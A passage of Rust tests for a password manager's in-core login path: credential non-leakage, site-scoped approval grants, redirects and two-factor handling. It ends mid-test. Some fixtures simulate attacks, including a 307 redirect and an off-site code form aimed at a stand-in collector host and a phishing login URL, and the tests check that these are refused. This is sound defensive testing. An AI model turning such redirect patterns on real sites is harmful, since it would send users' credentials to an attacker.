//! Tests for the M9a in-core login path.
//!
//! Structured to mirror `security/formal/m9a_in_core_login.spthy`: each of the
//! model's lemmas has a test that would fail if the corresponding guard were
//! removed, plus tests for the two things the model abstracts away — parsing a
//! login form and parsing `Set-Cookie` — because that is where the real code
//! can be wrong while the model stays true.

use super::*;
use crate::crypto::Crypto;
use crate::vault::{VaultItem, VaultMeta};
use chrono::Utc;
use wiremock::matchers::{body_string_contains, method, path};
use wiremock::{Mock, MockServer, ResponseTemplate};

const PASSWORD: &str = "correct-horse-battery-staple-9137";

fn test_state(dir: &std::path::Path) -> Arc<AppState> {
    let state = Arc::new(AppState::for_test(dir));
    state.unlock_for_test(&Crypto::generate_rms());
    state
}

fn login_item(id: &str, url: &str, hardened: bool) -> VaultItem {
    let now = Utc::now();
    VaultItem::Login {
        meta: VaultMeta {
            id: id.to_string(),
            name: "Test site".to_string(),
            notes: None,
            created_at: now,
            updated_at: now,
            last_modified_device: None,
            favorite: false,
            shared: false,
            share_recipient: None,
        },
        url: url.to_string(),
        username: "ada".to_string(),
        pass: PASSWORD.to_string(),
        totp: None,
        app_ids: Vec::new(),
        credential_change_needs_reauth: Some(hardened),
        allow_second_factor_downgrade: None,
    }
}

/// A login page with a CSRF token, laid out the way a plain server-rendered
/// site does it.
fn login_page(action: &str) -> String {
    format!(
        r#"<html><body>
        <form method="POST" action="{action}">
          <input type="hidden" name="csrf" value="tok-abc123">
          <input type="text" name="user_email" autocomplete="username">
          <input type="password" name="pw">
          <input type="checkbox" name="remember" value="1" checked>
          <input type="checkbox" name="newsletter" value="1">
          <button type="submit" name="do" value="signin">Sign in</button>
        </form></body></html>"#
    )
}

async fn grant_for(server: &MockServer, item_id: &str) -> LoginGrant {
    let url = normalize_url(&server.uri()).unwrap();
    LoginGrant::mint(item_id.to_string(), site_key(&url), true)
}

// ── credential_never_leaks ────────────────────────────────────────────────────

/// The model's central claim, checked against the artifact that actually
/// crosses the boundary.
///
/// Serialising the whole outcome and searching it for the password is a blunter
/// test than asserting on fields, and deliberately so: it fails if anyone later
/// adds a field that happens to carry the plaintext, which is the mistake worth
/// catching. The type has no such field today, so this passes structurally
/// rather than by luck.
#[tokio::test]
async fn the_password_never_appears_in_what_leaves_the_core() {
    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/login"))
        .respond_with(ResponseTemplate::new(200).set_body_string(login_page("/session")))
        .mount(&server)
        .await;
    Mock::given(method("POST"))
        .and(path("/session"))
        .respond_with(
            ResponseTemplate::new(200)
                .append_header("set-cookie", "sid=abcdef; Path=/; HttpOnly; SameSite=Lax")
                .set_body_string("<html><body>Welcome, Ada</body></html>"),
        )
        .mount(&server)
        .await;

    let dir = tempfile::tempdir().unwrap();
    let state = test_state(dir.path());
    let login_url = format!("{}/login", server.uri());
    state.vault.write().add_item(login_item("i1", &login_url, false));

    let outcome = perform_login(
        &state,
        &LoginRequest {
            item_id: "i1".to_string(),
            login_url: None,
        },
        grant_for(&server, "i1").await,
    )
    .await
    .expect("login should succeed");

    let serialized = serde_json::to_string(&outcome).unwrap();
    assert!(
        !serialized.contains(PASSWORD),
        "the password reached the response: {serialized}"
    );
    assert_eq!(outcome.cookies.len(), 1);
    assert_eq!(outcome.cookies[0].name, "sid");
    assert!(outcome.looks_authenticated);
}

/// The site gets the credential; the caller gets the session. Both halves
/// matter — a test that only checked the second would pass on a login that
/// never sent anything.
#[tokio::test]
async fn the_site_receives_the_credential_and_the_csrf_token() {
    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/login"))
        .respond_with(ResponseTemplate::new(200).set_body_string(login_page("/session")))
        .mount(&server)
        .await;
    Mock::given(method("POST"))
        .and(path("/session"))
        .and(body_string_contains("csrf=tok-abc123"))
        .and(body_string_contains("user_email=ada"))
        .and(body_string_contains("do=signin"))
        .and(body_string_contains("remember=1"))
        .respond_with(
            ResponseTemplate::new(200)
                .append_header("set-cookie", "sid=abcdef; Path=/")
                .set_body_string("ok"),
        )
        .mount(&server)
        .await;

    let dir = tempfile::tempdir().unwrap();
    let state = test_state(dir.path());
    let login_url = format!("{}/login", server.uri());
    state.vault.write().add_item(login_item("i1", &login_url, false));

    let outcome = perform_login(
        &state,
        &LoginRequest {
            item_id: "i1".to_string(),
            login_url: None,
        },
        grant_for(&server, "i1").await,
    )
    .await
    .expect("login should succeed");
    assert!(outcome.looks_authenticated);

    // The mock only matches a body carrying the CSRF token, the username, the
    // submit button and the pre-checked box, so reaching here proves all four
    // were sent. The password is asserted separately because the matcher would
    // put it in the failure message.
    let posted = server.received_requests().await.unwrap();
    let body = posted
        .iter()
        .find(|r| r.url.path() == "/session")
        .map(|r| String::from_utf8_lossy(&r.body).to_string())
        .expect("the credential POST should have happened");
    assert!(body.contains("pw=correct-horse"), "password field missing");
    assert!(
        !body.contains("newsletter"),
        "an unchecked box was submitted: {body}"
    );
}

// ── The grant is one-shot and scoped (Human_Approve_Login / LoginGrant) ────────

/// A grant names an item and a site, and both are checked. Without this the
/// prompt is decorative: a caller could get approval for one site and spend it
/// posting the password at another.
#[tokio::test]
async fn a_grant_for_another_site_is_refused() {
    let server = MockServer::start().await;
    let dir = tempfile::tempdir().unwrap();
    let state = test_state(dir.path());
    let login_url = format!("{}/login", server.uri());
    state.vault.write().add_item(login_item("i1", &login_url, false));

    let elsewhere = LoginGrant::mint("i1".to_string(), "example.com".to_string(), true);
    let error = perform_login(
        &state,
        &LoginRequest {
            item_id: "i1".to_string(),
            login_url: None,
        },
        elsewhere,
    )
    .await
    .unwrap_err();

    assert!(matches!(error, LoginError::TargetMismatch { .. }), "{error:?}");
    assert!(
        server.received_requests().await.unwrap().is_empty(),
        "a refused login still talked to the site"
    );
}

#[tokio::test]
async fn a_grant_for_another_item_is_refused() {
    let server = MockServer::start().await;
    let dir = tempfile::tempdir().unwrap();
    let state = test_state(dir.path());
    let login_url = format!("{}/login", server.uri());
    state.vault.write().add_item(login_item("i1", &login_url, false));

    let wrong_item = grant_for(&server, "some-other-item").await;
    let error = perform_login(
        &state,
        &LoginRequest {
            item_id: "i1".to_string(),
            login_url: None,
        },
        wrong_item,
    )
    .await
    .unwrap_err();

    assert!(matches!(error, LoginError::TargetMismatch { .. }), "{error:?}");
}

/// Target redefinition: the caller asks for a login URL that is not the item's
/// site at all. Refused before any request goes out.
#[tokio::test]
async fn a_login_url_off_the_items_site_is_refused() {
    let dir = tempfile::tempdir().unwrap();
    let state = test_state(dir.path());
    state
        .vault
        .write()
        .add_item(login_item("i1", "https://bank.example", false));

    let grant = LoginGrant::mint("i1".to_string(), "bank.example".to_string(), true);
    let error = perform_login(
        &state,
        &LoginRequest {
            item_id: "i1".to_string(),
            login_url: Some("https://phish.example/login".to_string()),
        },
        grant,
    )
    .await
    .unwrap_err();

    match error {
        LoginError::TargetMismatch { approved, requested } => {
            assert_eq!(approved, "bank.example");
            assert_eq!(requested, "phish.example");
        }
        other => panic!("expected a target mismatch, got {other:?}"),
    }
}

/// A locked vault has nothing to log in with, and says so before prompting.
#[tokio::test]
async fn a_locked_vault_refuses() {
    let dir = tempfile::tempdir().unwrap();
    let state = Arc::new(AppState::for_test(dir.path()));
    state
        .vault
        .write()
        .add_item(login_item("i1", "https://bank.example", false));

    let grant = LoginGrant::mint("i1".to_string(), "bank.example".to_string(), true);
    let error = perform_login(
        &state,
        &LoginRequest {
            item_id: "i1".to_string(),
            login_url: None,
        },
        grant,
    )
    .await
    .unwrap_err();
    assert_eq!(error, LoginError::VaultLocked);
}

// ── SiteMode: what the session residual is worth ──────────────────────────────

/// The model states its persistence claim per site, so the response has to as
/// well. An item that has not been marked reports `SelfServe` — assuming a site
/// is careful is not a security argument.
#[tokio::test]
async fn an_unmarked_site_reports_the_pessimistic_residual() {
    let (outcome, _dir) = successful_login(false).await;
    assert_eq!(outcome.site_mode, SiteMode::SelfServe);
    assert!(
        outcome.residual_note.contains("change the account password"),
        "{}",
        outcome.residual_note
    );
}

#[tokio::test]
async fn a_hardened_site_reports_a_session_bounded_residual() {
    let (outcome, _dir) = successful_login(true).await;
    assert_eq!(outcome.site_mode, SiteMode::Hardened);
    assert!(
        outcome.residual_note.contains("Signing out")
            || outcome.residual_note.contains("signing out"),
        "{}",
        outcome.residual_note
    );
}

async fn successful_login(hardened: bool) -> (LoginOutcome, tempfile::TempDir) {
    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/login"))
        .respond_with(ResponseTemplate::new(200).set_body_string(login_page("/session")))
        .mount(&server)
        .await;
    Mock::given(method("POST"))
        .respond_with(
            ResponseTemplate::new(200)
                .append_header("set-cookie", "sid=abcdef; Path=/")
                .set_body_string("ok"),
        )
        .mount(&server)
        .await;

    let dir = tempfile::tempdir().unwrap();
    let state = test_state(dir.path());
    let login_url = format!("{}/login", server.uri());
    state
        .vault
        .write()
        .add_item(login_item("i1", &login_url, hardened));

    let outcome = perform_login(
        &state,
        &LoginRequest {
            item_id: "i1".to_string(),
            login_url: None,
        },
        grant_for(&server, "i1").await,
    )
    .await
    .expect("login should succeed");
    (outcome, dir)
}

// ── Redirects ─────────────────────────────────────────────────────────────────

/// Same-site redirects are followed, and cookies set along the way are kept —
/// plenty of sites set the real session cookie on the hop after the POST.
#[tokio::test]
async fn a_same_site_redirect_is_followed_and_its_cookies_kept() {
    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/login"))
        .respond_with(ResponseTemplate::new(200).set_body_string(login_page("/session")))
        .mount(&server)
        .await;
    Mock::given(method("POST"))
        .and(path("/session"))
        .respond_with(
            ResponseTemplate::new(302)
                .append_header("location", "/dashboard")
                .append_header("set-cookie", "sid=first; Path=/"),
        )
        .mount(&server)
        .await;
    Mock::given(method("GET"))
        .and(path("/dashboard"))
        .respond_with(
            ResponseTemplate::new(200)
                .append_header("set-cookie", "csrf2=second; Path=/")
                .set_body_string("<html><body>Dashboard</body></html>"),
        )
        .mount(&server)
        .await;

    let dir = tempfile::tempdir().unwrap();
    let state = test_state(dir.path());
    let login_url = format!("{}/login", server.uri());
    state.vault.write().add_item(login_item("i1", &login_url, false));

    let outcome = perform_login(
        &state,
        &LoginRequest {
            item_id: "i1".to_string(),
            login_url: None,
        },
        grant_for(&server, "i1").await,
    )
    .await
    .expect("login should succeed");

    let names: Vec<&str> = outcome.cookies.iter().map(|c| c.name.as_str()).collect();
    assert!(names.contains(&"sid"), "{names:?}");
    assert!(names.contains(&"csrf2"), "{names:?}");
    assert!(outcome.landing_url.ends_with("/dashboard"));
}

/// The one that matters: a redirect off the site is refused rather than
/// followed. `reqwest`'s default policy would have followed it, and a 307 would
/// have replayed the password body at whatever host the site named.
#[tokio::test]
async fn a_redirect_off_the_site_is_refused() {
    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/login"))
        .respond_with(ResponseTemplate::new(200).set_body_string(login_page("/session")))
        .mount(&server)
        .await;
    Mock::given(method("POST"))
        .and(path("/session"))
        .respond_with(
            ResponseTemplate::new(307)
                .append_header("location", "https://collector.example/take-it"),
        )
        .mount(&server)
        .await;

    let dir = tempfile::tempdir().unwrap();
    let state = test_state(dir.path());
    let login_url = format!("{}/login", server.uri());
    state.vault.write().add_item(login_item("i1", &login_url, false));

    let error = perform_login(
        &state,
        &LoginRequest {
            item_id: "i1".to_string(),
            login_url: None,
        },
        grant_for(&server, "i1").await,
    )
    .await
    .unwrap_err();

    assert_eq!(
        error,
        LoginError::CrossSiteRedirect("collector.example".to_string())
    );
}

// ── The second factor ─────────────────────────────────────────────────────────

/// A real base32 secret, so the code under test derives a real code.
const TOTP_SECRET: &str = "JBSWY3DPEHPK3PXP";

fn login_item_with_totp(id: &str, url: &str) -> VaultItem {
    let mut item = login_item(id, url, false);
    if let VaultItem::Login { totp, .. } = &mut item {
        *totp = Some(TOTP_SECRET.to_string());
    }
    item
}

/// GitHub's shape: a separate page, one code field, a CSRF token to carry.
fn two_factor_page() -> String {
    r#"<html><body><h1>Two-factor authentication</h1>
    <form method="POST" action="/sessions/two-factor">
      <input type="hidden" name="authenticity_token" value="tok-2fa">
      <input type="text" name="app_otp" autocomplete="one-time-code" inputmode="numeric">
      <button type="submit">Verify</button>
    </form></body></html>"#
        .to_string()
}

async fn two_factor_site(accept_code: bool) -> (MockServer, tempfile::TempDir, Arc<AppState>) {
    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/login"))
        .respond_with(ResponseTemplate::new(200).set_body_string(login_page("/session")))
        .mount(&server)
        .await;
    // The password is accepted, and the site then asks for a code.
    Mock::given(method("POST"))
        .and(path("/session"))
        .respond_with(
            ResponseTemplate::new(200)
                .append_header("set-cookie", "stage=awaiting-2fa; Path=/")
                .set_body_string(two_factor_page()),
        )
        .mount(&server)
        .await;
    Mock::given(method("POST"))
        .and(path("/sessions/two-factor"))
        .respond_with(if accept_code {
            ResponseTemplate::new(200)
                .append_header("set-cookie", "sid=full-session; Path=/; HttpOnly")
                .set_body_string("<html><body>Welcome, Ada</body></html>")
        } else {
            // A wrong code re-serves the prompt, which is what real sites do.
            ResponseTemplate::new(200).set_body_string(two_factor_page())
        })
        .mount(&server)
        .await;

    let dir = tempfile::tempdir().unwrap();
    let state = test_state(dir.path());
    let login_url = format!("{}/login", server.uri());
    state
        .vault
        .write()
        .add_item(login_item_with_totp("i1", &login_url));
    (server, dir, state)
}

#[tokio::test]
async fn a_two_factor_site_is_answered_from_the_vault() {
    let (server, _dir, state) = two_factor_site(true).await;

    let outcome = perform_login(
        &state,
        &LoginRequest {
            item_id: "i1".to_string(),
            login_url: None,
        },
        grant_for(&server, "i1").await,
    )
    .await
    .expect("login should complete");

    assert!(outcome.used_second_factor);
    assert!(outcome.looks_authenticated);
    assert!(
        outcome.cookies.iter().any(|c| c.name == "sid"),
        "the post-2FA session cookie is missing: {:?}",
        outcome.cookies.iter().map(|c| &c.name).collect::<Vec<_>>()
    );

    // The code the site received is the one the shared secret produces, and the
    // CSRF token from the *second* page was carried, not the first.
    let posted = server.received_requests().await.unwrap();
    let body = posted
        .iter()
        .find(|r| r.url.path() == "/sessions/two-factor")
        .map(|r| String::from_utf8_lossy(&r.body).to_string())
        .expect("the second-factor POST should have happened");
    let expected = crate::totp::generate_totp_code(TOTP_SECRET).expect("a code");
    assert!(body.contains(&format!("app_otp={expected}")), "{body}");
    assert!(body.contains("authenticity_token=tok-2fa"), "{body}");
}

/// Neither the code nor the secret may cross the boundary. A TOTP secret is a
/// standing credential — leaking it is worse than leaking one code.
#[tokio::test]
async fn neither_the_totp_secret_nor_the_code_leaves_the_core() {
    let (server, _dir, state) = two_factor_site(true).await;

    let outcome = perform_login(
        &state,
        &LoginRequest {
            item_id: "i1".to_string(),
            login_url: None,
        },
        grant_for(&server, "i1").await,
    )
    .await
    .unwrap();

    let serialized = serde_json::to_string(&outcome).unwrap();
    assert!(!serialized.contains(TOTP_SECRET), "{serialized}");
    assert!(!serialized.contains(PASSWORD), "{serialized}");
    let code = crate::totp::generate_totp_code(TOTP_SECRET).unwrap();
    assert!(!serialized.contains(&code), "the code was returned: {serialized}");
}

/// The password was accepted; the item just has no secret saved. Saying so is
/// the difference between a user who can fix it and one who cannot.
#[tokio::test]
async fn a_two_factor_site_without_a_saved_secret_says_which_half_worked() {
    let (server, dir, _state) = two_factor_site(true).await;
    // Same site, but an item with no TOTP.
    let state = test_state(dir.path());
    let login_url = format!("{}/login", server.uri());
    state.vault.write().add_item(login_item("i1", &login_url, false));

    let error = perform_login(
        &state,
        &LoginRequest {
            item_id: "i1".to_string(),
            login_url: None,
        },
        grant_for(&server, "i1").await,
    )
    .await
    .unwrap_err();

    assert_eq!(error, LoginError::TwoFactorRequired);
    let message = error.to_string();
    assert!(message.contains("password was accepted"), "{message}");
}

/// A wrong or stale code re-serves the prompt, and that is not a login.
#[tokio::test]
async fn a_rejected_code_is_not_reported_as_signed_in() {
    let (server, _dir, state) = two_factor_site(false).await;

    let outcome = perform_login(
        &state,
        &LoginRequest {
            item_id: "i1".to_string(),
            login_url: None,
        },
        grant_for(&server, "i1").await,
    )
    .await
    .unwrap();

    assert!(outcome.used_second_factor);
    assert!(
        !outcome.looks_authenticated,
        "the two-factor prompt came back and we called it a success"
    );
}

/// The load-bearing distinction. A wrong password and a two-factor prompt both
/// come back as "a form"; treating the first as the second would spend a TOTP
/// code on a page that never asked for one, and report the failure as a
/// second-factor problem.
#[test]
fn a_returned_login_form_is_not_a_second_factor_prompt() {
    let base = Url::parse("https://site.example/session").unwrap();

    assert!(
        discover_second_factor_form(&login_page("/session"), &base).is_none(),
        "a login form was taken for a two-factor prompt"
    );
    assert!(discover_second_factor_form(&two_factor_page(), &base).is_some());

    // The case the "no password field" rule actually exists for, and the one a
    // plain login form does not exercise: plenty of sites re-serve a combined
    // page carrying both the password field and the code field. That is a
    // login form — the password has not been accepted yet — and treating it as
    // a second-factor prompt would post a TOTP code with no password at all,
    // burning the code and reporting the wrong failure.
    let combined = r#"<html><body>
      <form method="POST" action="/session">
        <input type="hidden" name="authenticity_token" value="t">
        <input type="text" name="login">
        <input type="password" name="password">
        <input type="text" name="otp" autocomplete="one-time-code">
      </form></body></html>"#;
    assert!(
        discover_second_factor_form(combined, &base).is_none(),
        "a page still asking for the password was taken for a two-factor prompt"
    );
    // And it is still recognisable as the login form it is.
    let form = discover_form(combined, &base).expect("a login form");
    assert_eq!(form.password_field, "password");
}

/// The heuristics, stated as cases. A promo-code box is not a second factor.
#[test]
fn only_code_shaped_fields_count_as_a_second_factor() {
    let base = Url::parse("https://site.example/").unwrap();
    let form = |inner: &str| format!(r#"<form method="POST" action="/x">{inner}</form>"#);

    // The spec's own signal.
    assert!(discover_second_factor_form(
        &form(r#"<input type="text" name="q" autocomplete="one-time-code">"#), &base).is_some());
    // Named unambiguously.
    for name in ["otp", "app_otp", "totp", "two_factor_code", "mfa_code", "authenticator"] {
        assert!(
            discover_second_factor_form(&form(&format!(r#"<input type="text" name="{name}">"#)), &base)
                .is_some(),
            "{name} should be recognised"
        );
    }
    // "code" alone is a promo box until the markup says it takes digits.
    assert!(discover_second_factor_form(
        &form(r#"<input type="text" name="discount_code">"#), &base).is_none());
    assert!(discover_second_factor_form(
        &form(r#"<input type="text" name="discount_code" inputmode="numeric">"#), &base).is_some());
    // A GET form is not submitted here either.
    assert!(discover_second_factor_form(
        r#"<form method="GET" action="/x"><input type="text" name="otp"></form>"#, &base).is_none());
}

/// The second factor gets the same origin rule as the first.
#[tokio::test]
async fn a_second_factor_form_pointing_off_site_is_refused() {
    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/login"))
        .respond_with(ResponseTemplate::new(200).set_body_string(login_page("/session")))
        .mount(&server)
        .await;
    Mock::given(method("POST"))
        .and(path("/session"))
        .respond_with(ResponseTemplate::new(200).set_body_string(
            r#"<html><form method="POST" action="https://collector.example/take">
               <input type="text" name="otp"></form></html>"#,
        ))
        .mount(&server)
        .await;

    let dir = tempfile::tempdir().unwrap();
    let state = test_state(dir.path());
    let login_url = format!("{}/login", server.uri());
    state
        .vault
        .write()
        .add_item(login_item_with_totp("i1", &login_url));

    let error = perform_login(
        &state,
        &LoginRequest {
            item_id: "i1".to_string(),
            login_url: None,
        },
        grant_for(&server, "i1").await,
    )
    .await
    .unwrap_err();

    assert_eq!(
        error,
        LoginError::CrossSiteRedirect("collector.example".to_string())
    );
}

/// One approval covers the whole login, both steps. Asserted because it is a
/// deliberate reading of the model's `LoginGrant`, not an accident: the human
/// approved "sign in to this site", and the site's decision to ask twice is not
/// a second question to them.
#[tokio::test]
async fn one_grant_covers_both_steps_of_a_two_step_login() {
    let (server, _dir, state) = two_factor_site(true).await;

    let outcome = perform_login(
        &state,
        &LoginRequest {
            item_id: "i1".to_string(),
            login_url: None,
        },
        // Exactly one grant is minted, and the login below consumes it.
        grant_for(&server, "i1").await,
    )
    .await
    .expect("one grant should be enough");

    assert!(outcome.used_second_factor);
    let posted = server.received_requests().await.unwrap();
    assert_eq!(
        posted.iter().filter(|r| r.method.as_str() == "POST").count(),
        2,
        "both steps should have been posted under the one grant"
    );
}

/// The regression from the first real GitHub login.
///
/// GitHub accepted the password, issued `_gh_sess` and friends, and parked us
/// on `/sessions/two-factor/webauthn` because that account prefers a security
/// key. Both "is the site still asking?" signals missed — a WebAuthn page has
/// no password field and no code field — so the outcome said
/// `looks_authenticated = true` while no session existed. A partial session
/// reported as a login is worse than a failure: the browser would have
/// installed it, navigated, and told the user they were signed in.
#[tokio::test]
async fn a_security_key_gate_is_not_reported_as_a_successful_login() {
    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/login"))
        .respond_with(ResponseTemplate::new(200).set_body_string(login_page("/session")))
        .mount(&server)
        .await;
    Mock::given(method("POST"))
        .and(path("/session"))
        .respond_with(
            ResponseTemplate::new(302)
                .append_header("location", "/sessions/two-factor/webauthn")
                // The real cookies GitHub issued at this stage.
                .append_header("set-cookie", "_gh_sess=partial; Path=/; HttpOnly; Secure")
                .append_header("set-cookie", "logged_in=no; Path=/; HttpOnly; Secure"),
        )
        .mount(&server)
        .await;
    Mock::given(method("GET"))
        .and(path("/sessions/two-factor/webauthn"))
        .respond_with(ResponseTemplate::new(200).set_body_string(
            // No password field, no code field — which is why the old
            // heuristics saw nothing to object to.
            r#"<html><body><h1>Use your security key</h1>
               <p>Insert your security key and tap it.</p>
               <div data-webauthn-support="supported"></div>
               </body></html>"#,
        ))
        .mount(&server)
        .await;

    let dir = tempfile::tempdir().unwrap();
    let state = test_state(dir.path());
    let login_url = format!("{}/login", server.uri());
    state
        .vault
        .write()
        .add_item(login_item_with_totp("i1", &login_url));

    let outcome = perform_login(
        &state,
        &LoginRequest {
            item_id: "i1".to_string(),
            login_url: None,
        },
        grant_for(&server, "i1").await,
    )
    .await
    .expect("the request itself succeeded");

    assert!(
        !outcome.looks_authenticated,
        "a security-key gate was reported as a completed login"
    );
    assert_eq!(
        outcome.awaiting_second_factor.as_deref(),
        Some("a security key or passkey")
    );
    assert!(!outcome.used_second_factor);
    // The partial session is still handed back — it is what lets the user
    // finish in the browser — but it is not called a login.
    assert!(outcome.cookies.iter().any(|c| c.name == "_gh_sess"));
}

/// The mirror image, and the reason detection is by markup rather than URL: a
/// site that accepts the code very often serves the next page from a path that
/// still says `two-factor`. Keying on the URL would report failure on success.
#[tokio::test]
async fn answering_the_code_is_not_undone_by_the_url_it_lands_on() {
    let (server, _dir, state) = two_factor_site(true).await;

    let outcome = perform_login(
        &state,
        &LoginRequest {
            item_id: "i1".to_string(),
            login_url: None,
        },
        grant_for(&server, "i1").await,
    )
    .await
    .unwrap();

    assert!(outcome.landing_url.contains("two-factor"), "{}", outcome.landing_url);
    assert_eq!(outcome.awaiting_second_factor, None);
    assert!(outcome.looks_authenticated);
}

// ── The factor downgrade, which is opt-in ─────────────────────────────────────

/// GitHub's shape: a security-key page that also offers the authenticator app.
async fn security_key_site_offering_totp() -> (MockServer, tempfile::TempDir) {
    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/login"))
        .respond_with(ResponseTemplate::new(200).set_body_string(login_page("/session")))
        .mount(&server)
        .await;
    Mock::given(method("POST"))
        .and(path("/session"))
        .respond_with(
            ResponseTemplate::new(302)
                .append_header("location", "/sessions/two-factor/webauthn")
                .append_header("set-cookie", "_gh_sess=partial; Path=/; HttpOnly"),
        )
        .mount(&server)
        .await;
    Mock::given(method("GET"))
        .and(path("/sessions/two-factor/webauthn"))
        .respond_with(ResponseTemplate::new(200).set_body_string(
            r#"<html><body><h1>Use your security key</h1>
               <a href="/sessions/two-factor/app">Use your authenticator app</a>
               <a href="/sessions/two-factor/recovery">Use a recovery code</a>
               </body></html>"#,
        ))
        .mount(&server)
        .await;
    Mock::given(method("GET"))
        .and(path("/sessions/two-factor/app"))
        .respond_with(ResponseTemplate::new(200).set_body_string(two_factor_page()))
        .mount(&server)
        .await;
    Mock::given(method("POST"))
        .and(path("/sessions/two-factor"))
        .respond_with(
            ResponseTemplate::new(200)
                .append_header("set-cookie", "sid=full-session; Path=/; HttpOnly")
                .set_body_string("<html><body>Welcome, Ada</body></html>"),
        )
        .mount(&server)
        .await;
    let dir = tempfile::tempdir().unwrap();
    (server, dir)
}

fn downgrade_item(id: &str, url: &str, opted_in: bool) -> VaultItem {
    let mut item = login_item_with_totp(id, url);
    if let VaultItem::Login {
        allow_second_factor_downgrade,
        ..
    } = &mut item
    {
        *allow_second_factor_downgrade = Some(opted_in);
    }
    item
}

/// The default. A site that chose a phishing-resistant factor keeps it, even
/// though the vault holds a code that would have got us in.
#[tokio::test]
async fn a_stronger_factor_is_not_downgraded_without_the_opt_in() {
    let (server, dir) = security_key_site_offering_totp().await;
    let state = test_state(dir.path());
    let login_url = format!("{}/login", server.uri());
    state
        .vault
        .write()
        .add_item(downgrade_item("i1", &login_url, false));

    let outcome = perform_login(
        &state,
        &LoginRequest {
            item_id: "i1".to_string(),
            login_url: None,
        },
        grant_for(&server, "i1").await,
    )
    .await
    .unwrap();

    assert!(!outcome.second_factor_downgraded);
    assert!(!outcome.used_second_factor);
    assert!(!outcome.looks_authenticated);
    assert_eq!(
        outcome.awaiting_second_factor.as_deref(),
        Some("a security key or passkey")
    );
    // The weaker route was visible and deliberately not taken.
    let asked: Vec<String> = server
        .received_requests()
        .await
        .unwrap()
        .iter()
        .map(|r| r.url.path().to_string())
        .collect();
    assert!(
        !asked.iter().any(|p| p.contains("two-factor/app")),
        "the authenticator route was taken without the opt-in: {asked:?}"
    );
}

/// With the opt-in, the same site completes — and the outcome says so, because
/// turning the setting on once is not the same as being told each time.
#[tokio::test]
async fn the_opt_in_completes_the_login_and_reports_the_downgrade() {
    let (server, dir) = security_key_site_offering_totp().await;
    let state = test_state(dir.path());
    let login_url = format!("{}/login", server.uri());
    state
        .vault
        .write()
        .add_item(downgrade_item("i1", &login_url, true));

    let outcome = perform_login(
        &state,
        &LoginRequest {
            item_id: "i1".to_string(),
            login_url: None,
        },
        grant_for(&server, "i1").await,
    )
    .await
    .unwrap();

    assert!(outcome.second_factor_downgraded);
    assert!(outcome.used_second_factor);
    assert!(outcome.looks_authenticated);
    assert_eq!(outcome.awaiting_second_factor, None);
    assert!(outcome.cookies.iter().any(|c| c.name == "sid"));
}

/// A recovery code is a one-shot backup the vault does not hold and must never
/// spend. It sits next to the authenticator link on the same page, so the
/// distinction has to be made in the matching rather than by ordering luck.
#[test]
fn a_recovery_code_link_is_never_taken_for_an_authenticator_one() {
    let base = Url::parse("https://github.com/sessions/two-factor/webauthn").unwrap();

    // Wording that trips the code-shaped markers ("enter a code",
    // "verification code") and must still be rejected, because it is a
    // recovery route. Anything blander never reaches the exclusion at all and
    // so would not test it — the first version of this test made exactly that
    // mistake and passed with the exclusion deleted.
    let recovery_first = r#"<html>
      <a href="/sessions/two-factor/recovery">Enter a code from your recovery codes</a>
      <a href="/sessions/two-factor/app">Use your authenticator app</a>
    </html>"#;
    let link = find_totp_alternative_link(recovery_first, &base).expect("a link");
    assert_eq!(
        link.path(),
        "/sessions/two-factor/app",
        "a recovery route was taken in preference to the authenticator one"
    );

    let only_recovery = r#"<html>
      <a href="/sessions/two-factor/recovery">Enter a verification code from your recovery sheet</a>
      <a href="/settings/backup">Use a backup authentication code</a>
    </html>"#;
    assert!(
        find_totp_alternative_link(only_recovery, &base).is_none(),
        "a recovery code would have been spent; the vault does not hold one"
    );
}

/// The Netflix case: the login page is not where the URL says it is.
///
/// `/login` 302s to `/fr-en/login` for the locale, and with redirects off on
/// the client that meant reading an empty 302 body, finding no form in it, and
/// reporting "this site signs in with JavaScript". Locale, trailing-slash,
/// http→https and www redirects on a login URL are all ordinary; none of them
/// mean what that error said.
///
/// The relative form action is the second half: it has to resolve against where
/// the page ended up, not where it was asked for, or the credential POST goes
/// to the wrong path.
#[tokio::test]
async fn a_login_page_that_redirects_is_still_a_login_page() {
    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/login"))
        .respond_with(ResponseTemplate::new(302).append_header("location", "/fr-en/login"))
        .mount(&server)
        .await;
    Mock::given(method("GET"))
        .and(path("/fr-en/login"))
        // A relative action, so it must resolve under /fr-en/.
        .respond_with(ResponseTemplate::new(200).set_body_string(login_page("session")))
        .mount(&server)
        .await;
    Mock::given(method("POST"))
        .and(path("/fr-en/session"))
        .respond_with(
            ResponseTemplate::new(200)
                .append_header("set-cookie", "sid=ok; Path=/")
                .set_body_string("<html><body>Welcome</body></html>"),
        )
        .mount(&server)
        .await;

    let dir = tempfile::tempdir().unwrap();
    let state = test_state(dir.path());
    let login_url = format!("{}/login", server.uri());
    state.vault.write().add_item(login_item("i1", &login_url, false));

    let outcome = perform_login(
        &state,
        &LoginRequest {
            item_id: "i1".to_string(),
            login_url: None,
        },
        grant_for(&server, "i1").await,
    )
    .await
    .expect("a redirecting login page should still work");

    assert!(outcome.looks_authenticated);
    let posted: Vec<String> = server
        .received_requests()
        .await
        .unwrap()
        .iter()
        .map(|r| r.url.path().to_string())
        .collect();
    assert!(
        posted.iter().any(|p| p == "/fr-en/session"),
        "the relative action resolved against the wrong page: {posted:?}"
    );
}

/// The Netflix false positive.
///
/// Its sign-in page offers passkey sign-in *next to* the password box, so the
/// word is in the markup. A rejected password left us back on that page, and
/// the gate detection read the word and reported "your password was accepted,
/// now use your security key" — wrong about both halves, and it would have sent
/// the user hunting for a key nothing had asked for.
#[tokio::test]
async fn a_login_page_that_merely_offers_passkeys_is_not_a_security_key_gate() {
    let server = MockServer::start().await;
    // A login page that mentions passkeys, as plenty now do.
    let page_with_passkey_option = format!(
        r#"<html><body>{}
        <div class="alt-signin">
          <button type="button">Sign in with a passkey</button>
          <p>Use a security key or passkey instead of your password.</p>
        </div></body></html>"#,
        login_page("/session")
    );

